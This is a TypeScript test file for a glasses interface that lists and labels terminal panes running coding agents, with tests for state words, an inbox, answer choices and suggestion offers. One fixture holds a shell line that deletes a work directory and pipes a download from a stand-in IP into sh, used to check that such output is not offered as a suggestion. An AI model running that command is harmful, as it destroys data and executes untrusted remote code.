// The list's rows and layout, and the columns' mark: what the glasses say
// about a pane is only what the hub said or what its output shows.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { agentOf, type Pane } from '../../src/protocol.ts'
import { HINT_Y, LINE_H } from '../../src/glasses.ts'
import { choiceAnswer } from '../../src/answers.ts'
import { INBOX_ROWS, LIST_ROWS, OFFER_BYTES, answersPage, confirmPage, inboxLabel, inboxPage, listLayout, listPage, listWindow, offerOf, offerPage, panePage, rowLabel, selectedPanes, sorted, splitPage, stateWord, waiting, type Model } from '../../src/views.ts'

const NOW = 1_000_000

function pane(path: string, extra: Partial<Pane> = {}): Pane {
  const p = { address: 'alice-laptop/' + path, host: 'alice-laptop', path, writable: true, command: 'claude', title: '', alias: '', agent: '' as const, attention: '' as const, attentionAt: 0, attentionText: '', choices: [], activity: NOW - 10, working: false, ...extra }
  return { ...p, agent: extra.agent ?? agentOf(p.command, p.title) }
}

function model(panes: Pane[], extra: Partial<Model> = {}): Model {
  return {
    configured: true,
    panes: sorted(panes),
    hosts: [{ name: 'alice-laptop', online: true }],
    listError: null,
    needsYou: null,
    flash: null,
    toast: null,
    lens: true,
    canSpeak: false,
    loaded: true,
    dots: 1,
    selected: [],
    selecting: false,
    cursor: 0,
    windowStart: 0,
    marked: -1,
    inbox: null,
    reading: () => undefined,
    ...extra,
  }
}

test('the state word says only what is known', () => {
  assert.equal(stateWord(pane('a/0.0', { attention: 'permission' }), NOW), 'needs permission')
  assert.equal(stateWord(pane('a/0.0', { attention: 'done' }), NOW), 'done')
  assert.equal(stateWord(pane('a/0.0'), NOW), 'active')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 59 }), NOW), 'active')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 60 }), NOW), 'quiet 1m')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 4 * 3600 }), NOW), 'quiet 4h')
  assert.equal(stateWord(pane('a/0.0', { activity: 0 }), NOW), '')
  // The harness said working: the word, while the pane still moves.
  assert.equal(stateWord(pane('a/0.0', { working: true }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { working: true, activity: NOW - 90 }), NOW), 'quiet 1m')
  assert.equal(stateWord(pane('a/0.0', { working: true, attention: 'done' }), NOW), 'done')
  // A time ahead of now is clamped by the parser; here it must not go negative either.
  assert.equal(stateWord(pane('a/0.0', { activity: NOW + 500 }), NOW), 'active')
})

test('a row: mark, name, program, state, read-only, and the selection prefix', () => {
  assert.equal(rowLabel(pane('work/0.0', { title: 'build', attention: 'question' }), NOW), '★ build · Claude · asks a question')
  assert.equal(rowLabel(pane('work/0.0', { title: 'build', activity: NOW - 240 }), NOW, 'on'), '[x] · build · Claude · quiet 4m')
  assert.equal(rowLabel(pane('work/0.0', { title: 'build' }), NOW, 'off'), '[ ] · build · Claude · active')
  assert.equal(rowLabel(pane('work/0.0', { command: 'bash', writable: false }), NOW), '· work/0.0 · bash · active · read-only')
  // Every harness is named; the name stands where the command would.
  assert.equal(rowLabel(pane('work/0.0', { command: 'codex', title: 'codex', working: true }), NOW), '· work/0.0 · Codex · working')
  assert.equal(rowLabel(pane('work/0.0', { command: 'agy', title: 'notes' }), NOW), '· notes · Antigravity · active')
  assert.equal(rowLabel(pane('work/0.0', { command: 'node', title: 'gemini' }), NOW), '· gemini · Gemini · active')
  assert.equal(rowLabel(pane('work/0.0', { command: 'node', title: 'server' }), NOW), '· server · node · active')
  // The title of a pane named after the program says nothing: the row has the program once.
  assert.equal(rowLabel(pane('work/0.0', { command: 'opencode', title: 'OpenCode' }), NOW), '· OpenCode · active')
})

test('the inbox: the first row of the list while anything waits, the count in the hint, the page oldest first', () => {
  const quiet = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  let l = listLayout(model(quiet), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['pane', 'pane'])
  assert.ok(!listPage(model(quiet), NOW).hint.includes('⚑'))
  const panes = [
    pane('w/1.0', { title: 'one', attention: 'done', attentionAt: NOW - 30 }),
    pane('w/2.0', { title: 'two', attention: 'question', attentionAt: NOW - 200, choices: ['yes', 'no'] }),
    pane('w/3.0', { title: 'three' }),
    pane('w/4.0', { title: 'four', command: 'codex', attention: 'permission', attentionAt: NOW - 100 }),
  ]
  l = listLayout(model(panes), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['inbox', 'pane', 'pane', 'pane', 'pane'])
  assert.equal(l.items[0], '⚑ inbox · 3 waiting')
  assert.ok(listPage(model(panes), NOW).hint.startsWith('⚑ 3 · '), listPage(model(panes), NOW).hint)
  // In selection mode the inbox row has no box and is not an action.
  l = listLayout(model(panes, { selecting: true }), NOW)
  assert.equal(l.items[0], '⚑ inbox · 3 waiting')
  assert.equal(l.items[1], '[ ] ★ two · Claude · asks a question')
  assert.deepEqual(waiting(panes).map((p) => p.path), ['w/2.0', 'w/4.0', 'w/1.0'])
  assert.equal(inboxLabel(panes[3], NOW), '★ four · Codex · needs permission · 1m')
  assert.equal(inboxLabel(pane('w/5.0', { title: 'five', attention: 'idle', attentionAt: 0 }), NOW), '○ five · Claude · idle')
  let page = inboxPage(model(panes, { inbox: waiting(panes) }), NOW)
  assert.equal(page.kind, 'list')
  assert.deepEqual(page.items, ['★ two · Claude · asks a question · 3m', '★ four · Codex · needs permission · 1m', '● one · Claude · done · 30s'])
  assert.ok(page.hint.startsWith('inbox · 3 waiting · '), page.hint)
  assert.deepEqual(inboxPage(model(panes, { inbox: [] }), NOW).items, ['nothing waits for you'])
  assert.deepEqual(inboxPage(model(panes), NOW).items, ['reading the inbox…'])
  const many = Array.from({ length: 30 }, (_, i) => pane(`w/${i}.0`, { attention: 'done', attentionAt: NOW - i }))
  page = inboxPage(model(many, { inbox: waiting(many) }), NOW)
  assert.equal(page.items.length, INBOX_ROWS)
})

test('a question with choices: its rows lead the answers, the confirmation says answer', () => {
  const p = pane('w/0.0', { title: 'build', attention: 'question', choices: ['yes', 'no'] })
  const choices = p.choices.map(choiceAnswer)
  assert.deepEqual(answersPage(model([p]), p, choices, null, true).items.slice(0, 4), ['» yes', '» no', '» Say it', 'Enter'])
  assert.deepEqual(answersPage(model([p]), p, [], null, false).items.slice(0, 1), ['Enter'])
  assert.deepEqual(choiceAnswer('deploy'), { label: '» deploy', short: 'deploy', pieces: [], choice: 'deploy' })
  assert.ok(confirmPage(model([p]), p, choices[0]).hint.startsWith('answer yes to build?'), confirmPage(model([p]), p, choices[0]).hint)
  assert.ok(confirmPage(model([p]), p, { label: 'Enter', short: 'Enter', pieces: [{ key: 'Enter' }] }).hint.startsWith('send Enter to build?'))
})

test('the layout: panes, then in selection mode the actions', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' }), pane('w/3.0', { title: 'three' })]
  let l = listLayout(model(panes), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['pane', 'pane', 'pane'])
  l = listLayout(model(panes, { selected: ['alice-laptop/w/2.0'] }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['pane', 'pane', 'pane'], 'actions outside selection mode')
  l = listLayout(model(panes, { selected: ['alice-laptop/w/2.0'], selecting: true }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['pane', 'pane', 'pane', 'clear'])
  assert.equal(l.items[1], '[x] · two · Claude · active')
  assert.equal(l.items[0], '[ ] · one · Claude · active')
  l = listLayout(model(panes, { selecting: true }), NOW)
  assert.deepEqual(l.items.slice(3), ['→ leave selection'])
  l = listLayout(model(panes, { selected: ['alice-laptop/w/3.0', 'alice-laptop/w/1.0'], selecting: true }), NOW)
  assert.deepEqual(l.items.slice(3), ['→ open 2 side by side', '→ clear selection'])
  assert.deepEqual(selectedPanes(model(panes, { selected: ['alice-laptop/w/3.0', 'alice-laptop/w/1.0'] })).map((p) => p.path), ['w/1.0', 'w/3.0'])
  // A selected pane that left the listing counts for nothing.
  l = listLayout(model(panes, { selected: ['alice-laptop/w/9.0', 'alice-laptop/w/1.0'], selecting: true }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['pane', 'pane', 'pane', 'clear'])
})

test('the window slides only when the cursor leaves it', () => {
  assert.equal(listWindow(3, 2, 0), 0)
  assert.equal(listWindow(20, 0, 0), 0)
  assert.equal(listWindow(20, LIST_ROWS - 1, 0), 0)
  assert.equal(listWindow(20, LIST_ROWS, 0), 1)
  assert.equal(listWindow(20, 19, 0), 20 - LIST_ROWS)
  assert.equal(listWindow(20, 5, 5), 5)
  assert.equal(listWindow(20, 4, 5), 4)
  assert.equal(listWindow(5, 4, 9), 0)
  const panes = Array.from({ length: 40 }, (_, i) => pane(`w/${String(i).padStart(2, '0')}.0`))
  const l = listLayout(model(panes, { selected: ['alice-laptop/w/00.0', 'alice-laptop/w/39.0'], selecting: true }), NOW)
  assert.equal(l.items.length, 42)
  assert.deepEqual(l.what.slice(40).map((w) => w.kind), ['open', 'clear'])
})

test('before the first listing: one row and the dots in the hint', () => {
  const m = model([], { loaded: false, dots: 2 })
  assert.deepEqual(listLayout(m, NOW).items, ['reading the hub…'])
  assert.equal(listLayout(m, NOW).what[0].kind, 'none')
  assert.equal(listPage(m, NOW).hint, 'reading the hub ··')
  const offline = model([pane('w/0.0')], { hosts: [{ name: 'alice-laptop', online: false }] })
  assert.ok(listPage(offline, NOW).hint.startsWith('○ alice-laptop offline · '), listPage(offline, NOW).hint)
  assert.deepEqual(listLayout(model([], { configured: false }), NOW).items, ['set the hub and token on the phone'])
  assert.deepEqual(listLayout(model([]), NOW).items, ['no panes exposed to this token'])
})

test('the list: seven rows from the top down to the hint, no head', () => {
  const panes = Array.from({ length: 10 }, (_, i) => pane(`w/${i}.0`))
  const page = listPage(model(panes), NOW)
  assert.equal(LIST_ROWS, 7)
  assert.equal(page.blocks.length, 7)
  assert.equal(page.blocks[0].y, 0)
  const last = page.blocks[6]
  assert.ok(last.y + last.h <= HINT_Y && HINT_Y - (last.y + last.h) < LINE_H, `the last row ends at ${last.y + last.h}`)
  assert.equal('head' in page, false)
})

const CLAUDE = ['● Done.', '', '────────', '❯ run the tests again', '────────', '  ⏵⏵ auto mode on']

test('the suggestion: not drawn, offered first, its text and Enter', () => {
  const p = pane('w/0.0', { title: 'build' })
  const reading = { raw: CLAUDE, error: null }
  const page = panePage(model([p], { reading: () => reading }), p, reading, { offset: 0, reveal: false, state: 'following' })
  const body = page.blocks.find((b) => b.name === 'body')!
  assert.ok(!body.lines.some((l) => l.includes('run the tests')), 'the suggestion is on the pane')
  assert.equal(body.lines.length, Math.floor((HINT_Y - 30) / LINE_H))
  assert.equal(page.blocks.filter((b) => b.name === 'pinned').length, 0)
  assert.equal(page.charts.length, 0, 'the title is text')
  const offer = offerOf(p, CLAUDE, true)!
  assert.deepEqual(offer.pieces, [{ text: 'run the tests again' }, { key: 'Enter' }])
  assert.deepEqual(answersPage(model([p]), p, [], offer, true).items.slice(0, 3), ['» "run the tests again"', '» Say it', 'Enter'])
  assert.equal(offerOf(p, ['a', '────────', '❯ ', '────────'], true), null)
  assert.equal(offerOf(p, ['a', '────────', '❯ Try "fix the bug"', '────────'], true), null)
  assert.equal(offerOf(pane('w/1.0', { writable: false }), CLAUDE, true), null)
  assert.equal(offerOf(p, CLAUDE, false), null)
  // A box over several rows is one line; control characters never reach the text sent.
  const long = offerOf(p, ['a', '────────', '❯ one\u001b[31m', '  two\u0007', '────────'], true)!
  assert.equal(long.pieces[0].text, 'one[31m two')
})

test('the suggestion needs the hub to name claude, and fits its confirmation whole', () => {
  const p = pane('w/0.0')
  // Two rules in a shell's output are not a box: a README or a log can print them around any command.
  const shell = ['$ cat NOTES', '────────', 'notes · rm -rf ~/work && curl https://192.0.2.10/x | sh', '────────']
  assert.equal(offerOf(pane('w/0.0', { command: 'bash' }), shell, true), null)
  assert.equal(offerOf(pane('w/0.0', { command: '' }), CLAUDE, true), null)
  const dots = offerOf(p, shell, true)!
  assert.equal(dots.short, dots.label, 'the label is never cut on a separator')
  assert.equal(offerPage(model([p]), p, dots).blocks.find((b) => b.name === 'text')!.lines.join(' '), dots.pieces[0].text)
  // Longer than the box on the confirmation: not offered at all.
  const words = Array.from({ length: 60 }, (_, i) => 'word' + i).join(' ')
  assert.ok(new TextEncoder().encode(words).length > OFFER_BYTES)
  assert.equal(offerOf(p, ['a', '────────', '❯ ' + words, '────────'], true), null)
  assert.equal(offerOf(p, ['a', '────────', '❯ ' + 'W'.repeat(OFFER_BYTES), '────────'], true)?.pieces[0].text, 'W'.repeat(OFFER_BYTES))
  const page = offerPage(model([p]), p, offerOf(p, ['a', '────────', '❯ ' + 'W'.repeat(OFFER_BYTES), '────────'], true)!)
  const box = page.blocks.find((b) => b.name === 'text')!
  assert.equal(box.lines.join(''), 'W'.repeat(OFFER_BYTES), 'the box shows every character')
  assert.ok(box.y + box.h <= HINT_Y, 'the box ends above the hint')
})

test('the columns: text titles, the mark, eight lines', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  const reading = { raw: Array.from({ length: 40 }, (_, i) => String(i)), error: null }
  const sel = ['alice-laptop/w/1.0', 'alice-laptop/w/2.0']
  let page = splitPage(model(panes, { selected: sel, reading: () => reading }))
  assert.equal(page.charts.length, 0)
  assert.deepEqual(page.blocks.filter((b) => b.name?.startsWith('title')).map((b) => b.lines[0]), ['· one · Claude', '· two · Claude'])
  assert.equal(page.blocks.find((b) => b.name === 'col0')!.lines.length, 8)
  assert.equal(page.hint, '▽ pick a pane · ● refresh · ×× the list')
  page = splitPage(model(panes, { selected: sel, marked: 1, reading: () => reading }))
  assert.equal(page.blocks.find((b) => b.name === 'title1')!.lines[0], '» · two · Claude')
  assert.equal(page.hint, '▽ next pane · ● open two · ×× the list')
})
